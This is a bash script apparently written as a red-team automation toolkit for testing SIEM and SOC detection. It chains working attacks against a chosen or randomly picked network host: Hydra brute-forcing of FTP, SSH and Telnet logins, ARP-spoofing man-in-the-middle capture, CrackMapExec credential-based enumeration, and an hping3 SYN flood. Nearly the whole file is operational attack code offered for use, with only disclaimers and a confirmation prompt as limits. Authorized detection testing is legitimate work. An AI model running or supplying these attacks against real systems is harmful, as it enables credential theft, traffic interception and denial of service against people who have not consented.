#!/bin/bash

# ============================================================================
# Checker Toolkit - Offensive Security Automation Script
#
# Author: Yarin Maimon
# Purpose: This tool is designed for internal cybersecurity testing,
#          validating SIEM and SOC detection and response mechanisms.
# Usage: Run interactively or via CLI flags to perform common attack simulations.
#        ./Checker.sh								 # Run in inactive mode
#		 ./Checker.sh --ip 192.168.1.1 --brute		 # Use flags to skip prompts
#
# Legal Notice:
#     This tool is intended for authorized testing and educational purposes only.
#     Unauthorized use is strictly prohibited and may be illegal.
# ============================================================================


# Environment Setup
HOME=$(pwd)		# Caprute the current working directory

# Output Styling
BOLD="\e[1m"
RED="\e[31m"
YELLOW="\e[33m"
GREEN="\e[32m"
RESET="\e[0m"

# Default Settings
LOGFILE="$HOME/Checker/checker.log"	# Default path for log output
ip=""								# Target IP placeholder
port=""								# Target port placeholder


# Module Toggles (controlled by CLI flags)
RUN_BRUTE=false			# Brute Force attack module
RUN_NMAP=false			# Nmap port scan module
RUN_MITM=false			# Man-in-the-Middle attack module
RUN_SMBENUM=false		# SMB enumeration module
RUN_DOS=false			# Denial of Service simulation module


# Help Menu Function
function HELP_MENU
{
	echo "Usage: $0 [options]"
	echo
	echo "Options:"
	echo "  -i, --ip <target_ip>      Specify the target IP address"
	echo "  -p, --port <port>         Specify port number (used in DoS/Brute)"
	echo "  -l, --log <logfile>       Specify custom log file path"
	echo "      --brute               Skip straight to brute force attack"
	echo "      --nmap                Skip straight to port scan"
	echo "      --mitm                Skip straight to Man-in-the-Middle attack"
	echo "      --smb                 Skip straight to SMB enumeration"
	echo "      --dos                 Skip straight to DoS attack"
	echo "  -h, --help                Show this help menu"
	exit 0
}


# Parses input flags and sets variables accordingly.
while [[ $# -gt 0 ]]; do
	case "$1" in
	-i|--ip)
	ip="$2"
	shift 2
	;;
	-p|--port)
	port="$2"
	shift 2
	;;
	-l|--log)
	LOGFILE="$2"
	shift 2
	;;
	--brute)
	RUN_BRUTE=true
	shift
	;;
	--nmap)
	RUN_NMAP=true
	shift
	;;
	--mitm)
	RUN_MITM=true
	shift
	;;
	--smb)
	RUN_SMBENUM=true
	shift
	;;
	--dos)
	RUN_DOS=true
	shift
	;;
	-h|--help)
	HELP_MENU
	;;
	*)
	echo " [-] Unknown option: $1"
	HELP_MENU
	;;
	esac
done


# Logs events and activity to the log file with a timestamp and user info.
function LOG_ENTRY()
{
	local type="$1"
	local message="$2"
	echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$(whoami)] [$type] - $message" >> "$LOGFILE"
}


# Retrieves the target IP address.
# Used by all modules to ensure consistent IP selection and avoid duplicate code.
function ADDRESSES()
{

	echo "Would you like me to scan your network or a different one?" | pv -qL 40
	echo -en "[1] Local network\n[2] Manual input\nEnter your choice: " | pv -qL 40
	read NET
	
	LOG_ENTRY "User Choice" "Selected network scan option: $NET"
	
	if [[ "$NET" == "1" ]]
		then
			SUBNET=$(ip addr show eth0 | grep -w 'inet' | awk '{print $2}')
			nmap "$SUBNET" -sn | grep report | awk '{print $NF}' > ./ip.txt
			
	elif [[ "$NET" == "2" ]]
		then
			echo "What network would you like to scan? (NOTE: use 0.0.0.0/24)" | pv -qL 40
			read address
			nmap "$address" -sn | grep report | awk '{print $NF}' > ./ip.txt
		else
			echo -e "${RED}Invalid choice. Exiting...${RESET}" | pv -qL 40
			exit 1
	fi
	
	if [[ ! -s ./ip.txt ]]
		then
			echo -e "${RED}No active hosts found! Exiting...${RESET}" | pv -qL 40
			exit 1
	fi
	
	
	# Read all discovered IPs into an array
	mapfile -t IP_LIST < ./ip.txt
	
	echo ""
	echo -e "${BOLD}Choose an IP to scan:${RESET}" | pv -qL 40
	
	# Display discovered IPs as a numbered list
    for i in "${!IP_LIST[@]}"
		do
			index=$((i + 1))
			echo "[$index] ${IP_LIST[$i]}" | pv -qL 40
	done
	
	random_index=$((${#IP_LIST[@]} + 1))
    echo "[$random_index] Random IP" | pv -qL 40

	
	echo -ne "\nEnter your choice (number): " | pv -qL 40
	read ip_choice
	
	if [[ "$ip_choice" -ge 1 && "$ip_choice" -le ${#IP_LIST[@]} ]]
		then
			ip="${IP_LIST[$((ip_choice-1))]}"
			echo -e "You selected: $ip" | pv -qL 40
			LOG_ENTRY "User Choice" "Manually selected IP: $ip"
			
	elif [[ "$ip_choice" -eq $random_index ]]
		then
			ip=$(shuf -n 1 ./ip.txt)
			echo -e "Randomly selected IP: $ip" | pv -qL 40
			LOG_ENTRY "User Choice" "Randomly selected IP: $ip"
			
	else
		echo -e "${RED}Invalid input! Exiting.${RESET}"
		exit 1
	fi
			
		
}


# Performs a brute force attack using Hydra against a selected service on the target IP.
# Prompts for user and password files and optionally protocol.
# If no IP is specified, jumps to ADDRESSES() for selection.
function BRUTE()
{
	proto="$1"
	echo "You chose Brute Force!" | pv -qL 40
	echo -e "${YELLOW}This attack will use Hydra to brute force the address that you choose.${RESET}" | pv -qL 40
	
	if [[ -z "$ip" ]]
		then
			ADDRESSES
		else
			echo -e "${BOLD}Using IP: $ip${RESET}" | pv -qL 40
	fi
	
	echo "Please insert the path to your usernames file:" | pv -qL 40
	read userfile
	echo "Please insert the path to your passwords file:" | pv -qL 40
	read passfile
	
	if [[ -z "$proto" ]]
		then
			echo "What protocol would you like to attack? [ftp/ssh/telnet/..]" | pv -qL 40
			read proto
	fi
	
	echo -e "${BOLD}Hydra starting...${RESET}" | pv -qL 40
	hydra -L "$userfile" -P "$passfile" "$ip" "$proto"
	
	if [[ $? -eq 0 ]]
		then
			LOG_ENTRY "Brute Force" "Target: $ip - Service: $proto - Status: Finished"
		else
			LOG_ENTRY "Brute Force" "Target: $ip - Service: $proto - Status: Failed or Aborted"
	fi
	
}

# Performs a port and service scan using Nmap and saves the result.
# Automatically detects vulnerable or brute-forceable services and offers follow-up attacks.
function NMAP()
{
	echo "You chose Port Scanning!" | pv -qL 40
	echo -e "${YELLOW}This attack will use Nmap to scan the open ports and find\nthe vulnerabilities of the address that you choose.${RESET}" | pv -qL 40
	if [[ -z "$ip" ]]
		then
			ADDRESSES
		else
			echo -e "${BOLD}Using IP: $ip${RESET}" | pv -qL 40
	fi
	
	echo -e "${BOLD}Starting Nmap...${RESET}" | pv -qL 40
	nmap -sV -sC $ip -oN "$HOME/Checker/nmap.txt" > /dev/null 2>&1
	if [[ $? -eq 0 ]]
		then
			LOG_ENTRY "Port Scan" "Target: $ip - Status: Completed"
		else
			LOG_ENTRY "Port Scan" "Target: $ip - Status: Failed or Aborted"
	fi
	
	
	
	echo -e " \n \n \n " >> "$HOME/Checker/nmap.txt"
	echo "Results also saved to $HOME/Checker/nmap.txt"
	
	services=$(grep -E '^[0-9]+/tcp' "$HOME/Checker/nmap.txt" | awk '{print $3}' | tr '\n' ' ')
	echo -e "\nDetected Services: $services" | pv -qL 40
	
	
	if echo "$services" | grep -q "ftp"
		then
			echo -e "${YELLOW}FTP detected. Would you like to run a brute force attack against it? [y/n]${RESET}" | pv -qL 40
			read ftp_choice
			[[ "$ftp_choice" == "y" ]] && BRUTE ftp
	fi
	
	if echo "$services" | grep -q "ssh"
		then
			echo -e "${YELLOW}SSH detected. Would you like to run a brute force attack against it? [y/n]${RESET}" | pv -qL 40
			read ssh_choice
			[[ "$ssh_choice" == "y" ]] && BRUTE ssh
	fi
	
	if echo "$services" | grep -q "telnet"
		then
			echo -e "${YELLOW}Telnet detected. Would you like to run a brute force attack against it? [y/n]${RESET}" | pv -qL 40
			read telnet_choice
			[[ "$telnet_choice" == "y" ]] && BRUTE telnet
	fi
}

# Man-In-The-Middle (MITM) attack using Arpspoof and TShark.
# Intercepts traffic between the target and router for a specified duration.
# Results are saved in a PCAP file for further analysis.
function MiTM()
{
	echo "You chose Man In The Middle!" | pv -qL 40
	echo -e "${YELLOW}This attack will use Arpspoof to manipulate your current router\ninto giving information about the address that you choose.${RESET}" | pv -qL 40
	if [[ -z "$ip" ]]
		then
			ADDRESSES
		else
			echo -e "${BOLD}Using IP: $ip${RESET}" | pv -qL 40
	fi
	
	router=$(ip route | grep default | awk '{print $3}')
	
	echo -ne "How much time(seconds) will the attack go on? " | pv -qL 40
	read time
	
	echo -e "${BOLD}Starting Arpspoof...${RESET}" | pv -qL 40
	
	tshark -w MiTM.pcap -i eth0 -a duration:"$time" > /dev/null 2>&1 &
	TSHARK_PID=$!
	 
	sudo arpspoof -i eth0 -t "$ip" "$router" > /dev/null 2>&1 &
	ARP_PID1=$!
	
	sudo arpspoof -i eth0 -t "$router" "$ip" > /dev/null 2>&1 &
	ARP_PID2=$!
	
	sleep "$time"
	sudo kill "$ARP_PID1" "$ARP_PID2" "$TSHARK_PID"
	sudo pkill "arpspoof"
	sudo pkill "tshark"
	
	echo -e "${RED}Stopping Arpspoof...${RESET}" | pv -qL 40
	echo "Attack finished. Packet saved as MiTM.pcap" | pv -qL 40
	
	if [[ $? -eq 0 ]]; then
		LOG_ENTRY "MiTM Attack" "Target: $ip - Status: Completed"
	else
		LOG_ENTRY "MiTM Attack" "Target: $ip - Status: Failed or Aborted"
	fi
}

# SMB Enumeration using CrackMapExec. Also supports RDP and WinRM services.
# Optionally uses credentials for deeper enumeration and can enumerate shares.
function SMBENUM()
{
	echo "You chose SMB Enumeration!" | pv -qL 40
	echo -e "${YELLOW}This attack will use CrackMapExec to enumerate common services on the selected IP.${RESET}" | pv -qL 40
	
	# Check if CrackMapExec is installed
	if ! command -v crackmapexec &> /dev/null
		then
		echo -e "${RED}CrackMapExec is not installed!$" | pv -qL 40
		echo -e "Would you like to install it? [y/n]${RESET}" | pv -qL 40
		read exec
			if [ "$exec" == "n" ]
				then
					echo -e "${RED}Ok... Exiting..." | pv -qL 40
					LOG_ENTRY "CrackMapExec" "Status: Failed - CME not installed"
					exit 1
			elif [ "$exec" == "y" ]
				then
					sudo apt-get install crackmapexec -y >/dev/null 2>&1
					echo -e "${GREEN}[!] CrackMapExec installed${RESET}" | pv -qL 40
					LOG_ENTRY "CrackMapExec" "Status: Installed - CrackMapExec installed by script"
			fi
	fi
		if [[ -z "$ip" ]]
		then
			ADDRESSES
		else
			echo -e "${BOLD}Using IP: $ip${RESET}" | pv -qL 40
	fi
		
		echo -e "Which service would you like to enumerate?\n[1] SMB\n[2] RDP\n[3] WinRM" | pv -qL 40
		echo -ne "Enter your choice: " | pv -qL 40
		read choice
		
		case "$choice" in
		1)
			service="smb"
			;;
		2)
			service="rdp"
			;;
		3)
			service="winrm"
			;;
		*)
			echo -e "${RED}Invalid option. Exiting.${RESET}" | pv -qL 40
			exit 1
			;;
	esac
	
	
	echo -e "Would you like to use credentials? [y/n]" | pv -qL 40
	read auth
	
	if [ "$auth" == "y" ]
		then
			read -p "Enter username: " user
			read -s -p "Enter password: " pass
			echo ""
			
			echo -e "Would you like to enumerate shares? [y/n]" | pv -qL 40
			read extra_info
			if [ "$extra_info" == "y" ]
				then
					echo -e "${BOLD}Running CrackMapExec $service scan on $ip with credentials and shares...${RESET}" | pv -qL 40
					crackmapexec "$service" "$ip" -u "$user" -p "$pass" --shares | tee "$HOME/Checker/cme_${service}_shares.txt"
			else
				echo -e "${BOLD}Running CrackMapExec $service scan on $ip with credentials...${RESET}" | pv -qL 40
				crackmapexec "$service" "$ip" -u "$user" -p "$pass" | tee "$HOME/Checker/cme_${service}.txt"
			fi
	else
		echo -e "Would you like to enumerate shares? [y/n]" | pv -qL 40
		read extra_info
		if [ "$extra_info" == "y" ]
			then
				echo -e "${BOLD}Running CrackMapExec $service scan on $ip anonymously and shares...${RESET}" | pv -qL 40
				crackmapexec "$service" "$ip" --shares | tee "$HOME/Checker/cme_${service}_shares.txt"
		else
			echo -e "${BOLD}Running CrackMapExec $service scan on $ip anonymously...${RESET}" | pv -qL 40
			crackmapexec "$service" "$ip" | tee "$HOME/Checker/cme_${service}.txt"
		fi
	fi
	
	
	if [[ $? -eq 0 ]]; then
		LOG_ENTRY "CrackMapExec" "Target: $ip - Service: $service - Status: Completed"
	else
		LOG_ENTRY "CrackMapExec" "Target: $ip - Service: $service - Status: Failed or Aborted"
	fi
	
	echo -e "Results saved to $HOME/Checker/cme_$service.txt" | pv -qL 40
	exit
}

# DoS Attack using hping3 to flood the target with SYN packets
function DOS_ATTACK()
{
	echo -e "You chose DoS!(Denial Of Service)" | pv -qL 40
	echo -e "${YELLOW}This attack uses hping3 to SYN flood the victim${RESET}" | pv -qL 40
	
	# Confirm with the user before launching a potentially illegal attack
	echo -ne "${RED}WARNING: This is potentially illegal on unauthorized networks.\nProceed? [y/n] ${RESET}" | pv -qL 40
	read confirm
		if [[ "$confirm" != "y" ]]
			then
				echo -e "${RED} [!] DoS aborted by user.${RESET}" | tee -a "$LOGFILE"
				return
		fi
	if [[ -z "$ip" ]]
		then
			ADDRESSES
		else
			echo -e "${BOLD}Using IP: $ip${RESET}" | pv -qL 40
	fi
	
	if [[ -z "$port" ]]
		then
			echo -ne "Enter the target port (e.g. 80): " | pv -qL 40
			read port
		else
			echo -e "${BOLD}Using port: $port${RESET}" | pv -qL 40
	fi
	
	echo -e "${BOLD} [+] Starting SYN flood on $ip:$port..." | pv -qL 40
	
	timeout 15s hping3 -S --flood -V -p "$port" "$ip"
	
	if [[ $? -eq 0 ]]; then
		LOG_ENTRY "DoS Attack" "Target: $ip - Port: $port - Status: Completed"
	else
		LOG_ENTRY "DoS Attack" "Target: $ip - Port: $port - Status: Failed or Aborted"
	fi
}

# Main Menu - lets the user select an attack or a random one
function MENU()
{
	
	# Ensure 'pv' is installed for nicer echo output
	dpkg -s pv >/dev/null 2>&1 ||
	sudo apt-get install pv -y >/dev/null 2>&1
	
	
	echo -e "Choose an attack:\n [1] Brute Force\n [2] Port Scan\n [3] Man In The Middle\n [4] SMB Enumeration\n [5] DoS Attack\n [6] Random Attack" | pv -qL 40
	echo -ne "Enter your choice: " | pv -qL 40
	read attack
	echo ""
	case $attack in
	1)
		BRUTE
	;;
	2)
		NMAP
	;;
	3)
		MiTM
	;;
	4)
		SMBENUM
	;;
	5)
		DOS_ATTACK
	;;
	6)
		random=$(shuf -e 1 2 3 4 5 | head -1)
		case $random in
			1)
				BRUTE
			;;
			2)
				NMAP
			;;
			3)
				MiTM
			;;
			4)
				SMBENUM
			;;
			5)
				DOS_ATTACK
			;;
		esac
	;;
	*)
		echo -e "${RED}Invalid option! Exiting!${RESET}" | pv -qL 45
		exit
	;;
	esac
	
}

echo -e "${BOLD}Warning! This script might require SUDO.${RESET}"

# Create the log file if it doesn’t exist, and give it proper permissions
if [[ ! -f "$LOGFILE" ]]
	then
		sudo touch "$LOGFILE"
		sudo chmod 666 "$LOGFILE"
fi

	# Ensure working directory exists
	mkdir -p $HOME/Checker
	cd $HOME/Checker

# Auto-run attack functions if flagged (optional flags in script)
$RUN_BRUTE && BRUTE
$RUN_NMAP && NMAP
$RUN_MITM && MiTM
$RUN_SMBENUM && SMBENUM
$RUN_DOS && DOS_ATTACK

# Call the menu function for user to pick an attack
MENU
